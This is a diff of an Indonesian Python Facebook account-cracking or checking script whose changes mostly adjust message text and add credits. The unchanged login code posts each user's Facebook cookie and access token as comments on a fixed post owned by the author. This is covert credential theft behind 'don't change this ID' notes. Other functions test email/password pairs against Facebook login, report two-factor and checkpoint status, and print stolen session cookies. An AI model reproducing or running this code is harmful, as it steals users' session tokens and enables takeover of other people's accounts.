@@ -1,6 +1,12 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
+###---------[Recode Aja Tapi Izin Dulu Sama Authornya]----------###
+
+###----------------[NOTE]----------------###
+'Chat Aja FB Author Nya Klo Gk Bisa Komen Aja Di Post FB Nya..."Bang PM"'
+'Klo Mau Recode Izin Dulu Tapi Jgn Ganti Bot Author Ngabs'
+
 ###--------[AUTHOR ]--------###
 Author   : 'FerlyXD'
 Github   : 'github.com/Shishigami-X'
@@ -236,11 +242,11 @@ def login():
 		jam      = datetime.now().strftime("%X")
 		data = ses.get(url,headers=head,cookies=cok)
 		token = re.search('(EAAG\w+)',data.text).group(1)
-		tem      = ('\nPanutan Gw Nih Boss😎 @[100056190665450:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n') ###--------[ JANGAN GANTI KOMENNYA ]--------###
-		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
-		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075') ###--------[ JANGAN GANTI ID NYA ]--------###
+		tem      = ('\nSehat Selalu Bang😎🖥 @[100056190665450:0]\n\nJangan Pernah Menjadi Orang Yang Menyombongkan Diri Sendiri, Karena Kita Hidup Di Dunia Ini Tidak Sendirian, Jika Ada Orang Yang Membutuhkan Apa Salah Nya Kita Memberikan\n') ###--------[ JANGAN GANTI KOMENNYA ]--------###
+		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini)) #-----GK USAH DI GANTI..ANGGAP SAJA SEBAGAI TANDA TERIMA KASIH-----#
+		link = ('https://www.facebook.com/photo?fbid=661200275762989&set=a.111112804105075') ###--------[ JANGAN GANTI TAUTAN NYA ]--------###
 		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Kamu Ganteng Banget Deh Ferly><😝"]) ###--------[ JANGAN GANTI KOMENNYA ]--------###
-		#ses.post(f"https://graph.facebook.com/661200275762989?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		#ses.post(f"https://graph.facebook.com/661200275762989?fields=subscribers&access_token={token}",headers=(cookies=cok) 
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={cookie}&access_token={token}",cookies=cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={token}&access_token={token}",cookies=cok) ###--------[ JANGAN GANTI ID NYA ]--------###
 		ses.post(f"https://graph.facebook.com/661200275762989/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok) ###--------[ JANGAN GANTI ID NYA ]--------###
@@ -889,24 +895,24 @@ def cek_opsi(idf,pw,ua):
 					'pass':pw})
 		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
 		ress = parser(res, 'html.parser')
-		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
-			akun += f'\n [{hh}>{P}] {hh}hore akun tap yes🎉{P}                       '
+		if 'Lihat Detail Login Yang Ditampilkan. Ini Anda?' in str(ress.find('title').text):
+			akun += f'\n [{hh}>{P}] {hh}Akun Tap Yes🎉{P}                       '
 		else:
 			if(len(sesi(res))==0):
-				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
-					akun += f'\n [{kk}>{P}] akun terpasang auten                     '
+				if 'Masukkan Kode Masuk Untuk Melanjutkan' in str(ress.find('title').text):
+					akun += f'\n [{kk}>{P}] Akun Terpasang A2F                     '
 				else:
 					cok = convert(ses.cookies.get_dict())
-					akun += f'\n [{hh}>{P}] akun tidak checkpoint                       \n [{hh}>{P}] cookie : {cok}'
+					akun += f'\n [{hh}>{P}] Akun Tidak Checkpoint                       \n [{hh}>{P}] Cookie : {cok}'
 			else:
-				akun += f'\n [{kk}>{P}] terdapat {len(opsi)} opsi :                     '
+				akun += f'\n [{kk}>{P}] Terdapat {len(opsi)} Opsi :                     '
 				o = 0
 				for cp in opsi:
 					o+=1
 					akun += f'\n [{kk}{o}{P}] {cp}               '
 		opsi.clear()
 	except Exception as e:
-		akun += f'\n [{M}>{P}] kata sandi salah / spam                      '
+		akun += f'\n [{M}>{P}] Kata Sandi Salah / Spam...DLL                      '
 	print('\r'+ akun)
 	print('\r                                                                       ')
 		
@@ -934,7 +940,7 @@ apk1, apk2, apk3 = [], [], []
 def cek_apk(idf,pw,kuki):
 	cookie = {"cookie" : kuki}
 	language(cookie)
-	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
+	akun = (f' [{hh}>{P}] Email  : {hh}{idf}{P}          \n [{hh}>{P}] Sandi  : {hh}{pw}          {P}\n [{hh}>{P}] Cookie : {hh}{kuki}{P}')
 	try:		
 		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
 		get_active(url,cookie)
@@ -950,7 +956,7 @@ def cek_apk(idf,pw,kuki):
 	print('\r'+akun)
 	if len(apk1)==0:pass
 	else:
-		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
+		akun = (f' [{hh}>{P}] Daftar Aplikasi Di Tambahkan :                     ')
 		no = 0
 		for apk in apk1:
 			no += 1
@@ -958,7 +964,7 @@ def cek_apk(idf,pw,kuki):
 		print('\r'+akun)
 	if len(apk2)==0:pass
 	else:
-		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
+		akun = (f' {P}[{kk}>{P}] Daftar Aplikasi Kadaluwarsa :                   ')
 		no = 0
 		for apk in apk2:
 			no += 1
@@ -966,7 +972,7 @@ def cek_apk(idf,pw,kuki):
 		print('\r'+akun)
 	if len(apk3)==0:pass
 	else:
-		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
+		akun = (f' {P}[{M}>{P}] Daftar Aplikasi Yang Di Hapus :                  ')
 		no = 0
 		for apk in apk3:
 			no += 1
